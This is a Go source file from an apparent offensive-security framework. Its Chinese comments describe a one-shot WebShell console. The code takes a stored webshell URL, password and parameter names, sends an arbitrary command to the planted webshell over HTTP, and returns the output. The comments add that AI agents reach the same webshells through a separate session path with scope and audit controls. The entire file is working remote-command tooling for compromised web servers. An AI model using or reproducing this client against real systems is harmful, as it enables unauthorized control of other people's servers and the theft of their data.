package server

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/c1ayooo/4zrec/internal/domain/db"
)

// WebShell 的一次性执行入口:连接台账控制台与 capkit 的 webshellExecutor 共用
// 同一份协议知识。
//
// 台账的 WebShell 条目把连接参数放在 extra 里(URL 型目标没有 kind 能表达的
// 主机/端口):url 是落点,secret 是口令,cmd_param/pass_param/method 是协议细节。
// 这里不经过 capkit 的 HTTPDoer:控制台是操作者驱动的单次手工操作,与 agent 走的
// 会话路径(带 scope/limiter/audit)是两回事。

// maxWebShellConsoleBytes bounds the console echo, so a payload that streams
// forever cannot hang the page.
const maxWebShellConsoleBytes = 1 << 20

// webshellConfig 是一条 WebShell 连接的全部参数。
type webshellConfig struct {
	URL       string
	Password  string
	CmdParam  string
	PassParam string
	Method    string
	ProxyURL  string
	ShellType string
	Timeout   time.Duration
}

// webshellConfigOf 从台账行还原配置。参数名缺省与 capkit 的 plain 载荷一致,
// 这样同一份凭据既能喂给控制台也能喂给会话。
func webshellConfigOf(c *db.Connection) webshellConfig {
	var extra struct {
		URL       string `json:"url"`
		CmdParam  string `json:"cmd_param"`
		PassParam string `json:"pass_param"`
		Method    string `json:"method"`
		Proxy     string `json:"proxy"`
		ShellType string `json:"shell_type"`
	}
	if c.Extra != nil {
		_ = jsonUnmarshalSafe(c.Extra, &extra)
	}
	conf := webshellConfig{
		URL:       strings.TrimSpace(extra.URL),
		Password:  c.Secret,
		CmdParam:  strings.TrimSpace(extra.CmdParam),
		PassParam: strings.TrimSpace(extra.PassParam),
		Method:    strings.TrimSpace(extra.Method),
		ProxyURL:  strings.TrimSpace(extra.Proxy),
		ShellType: strings.TrimSpace(extra.ShellType),
	}
	if conf.CmdParam == "" {
		conf.CmdParam = "cmd"
	}
	if conf.PassParam == "" {
		conf.PassParam = "pass"
	}
	if conf.Method == "" {
		conf.Method = http.MethodGet
	}
	return conf
}

// webshellOptions 是喂给 session_open 的 options(与会话执行器读的键同名)。
func (conf webshellConfig) webshellOptions() map[string]string {
	opts := map[string]string{
		"cmd_param":  conf.CmdParam,
		"pass_param": conf.PassParam,
		"method":     conf.Method,
	}
	if conf.ShellType != "" {
		opts["shell_type"] = conf.ShellType
	}
	if conf.ProxyURL != "" {
		opts["proxy"] = conf.ProxyURL
	}
	return opts
}

// execWebShellOnce 发一次请求并返回响应体。口令与命令按参数名编码进请求,
// 响应原样返回。
func execWebShellOnce(ctx context.Context, conf webshellConfig, command string) (string, error) {
	if conf.URL == "" {
		return "", fmt.Errorf("WebShell URL 为空")
	}
	timeout := conf.Timeout
	if timeout <= 0 {
		timeout = 60 * time.Second
	}
	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	query := url.Values{}
	query.Set(conf.PassParam, conf.Password)
	query.Set(conf.CmdParam, command)

	method := strings.ToUpper(conf.Method)
	target := conf.URL
	var body io.Reader
	if method == http.MethodGet || method == http.MethodHead {
		u, err := url.Parse(conf.URL)
		if err != nil {
			return "", fmt.Errorf("WebShell URL 无效: %w", err)
		}
		u.RawQuery = query.Encode()
		target = u.String()
	} else {
		body = strings.NewReader(query.Encode())
	}

	req, err := http.NewRequestWithContext(ctx, method, target, body)
	if err != nil {
		return "", err
	}
	if body != nil {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	client := &http.Client{}
	if conf.ProxyURL != "" {
		if pu, err := url.Parse(conf.ProxyURL); err == nil {
			client.Transport = &http.Transport{Proxy: http.ProxyURL(pu)}
		}
	}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer func() { _ = resp.Body.Close() }()
	raw, err := io.ReadAll(io.LimitReader(resp.Body, maxWebShellConsoleBytes))
	if err != nil {
		return "", err
	}
	out := string(raw)
	if resp.StatusCode >= 400 {
		return out, fmt.Errorf("HTTP %d: %s", resp.StatusCode, strings.TrimSpace(truncateForError(out)))
	}
	return out, nil
}

// truncateForError keeps a driver/protocol error message readable.
func truncateForError(s string) string {
	if len(s) > 200 {
		return s[:200] + "…"
	}
	return s
}
